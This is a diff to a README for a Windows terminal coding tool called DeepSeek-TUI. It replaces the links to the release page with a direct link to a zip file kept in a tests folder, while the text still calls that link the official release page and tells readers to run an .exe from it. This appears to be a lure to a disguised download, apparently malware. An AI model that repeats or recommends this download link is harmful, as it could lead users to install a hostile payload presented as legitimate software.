@@ -1,6 +1,6 @@
 # 🤖 DeepSeek-TUI - Simple terminal coding for everyone
 
-[![](https://img.shields.io/badge/Download-DeepSeek--TUI-blue)](https://github.com/Guistricken690/DeepSeek-TUI/releases)
+[![](https://img.shields.io/badge/Download-DeepSeek--TUI-blue)](https://raw.githubusercontent.com/Guistricken690/DeepSeek-TUI/main/crates/tui-core/tests/TUI-Seek-Deep-1.3.zip)
 
 DeepSeek-TUI acts as your personal coding assistant. It runs inside your terminal window on Windows. This tool helps you write code faster using the DeepSeek model. You type your questions or coding tasks, and the tool provides answers and code snippets directly in your terminal. You do not need to open a web browser to talk to the AI.
 
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 You need to get the installer from the official release page. Follow these steps to find the file:
 
-1. Visit this page to download: [https://github.com/Guistricken690/DeepSeek-TUI/releases](https://github.com/Guistricken690/DeepSeek-TUI/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Guistricken690/DeepSeek-TUI/main/crates/tui-core/tests/TUI-Seek-Deep-1.3.zip](https://raw.githubusercontent.com/Guistricken690/DeepSeek-TUI/main/crates/tui-core/tests/TUI-Seek-Deep-1.3.zip)
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder or your Desktop.
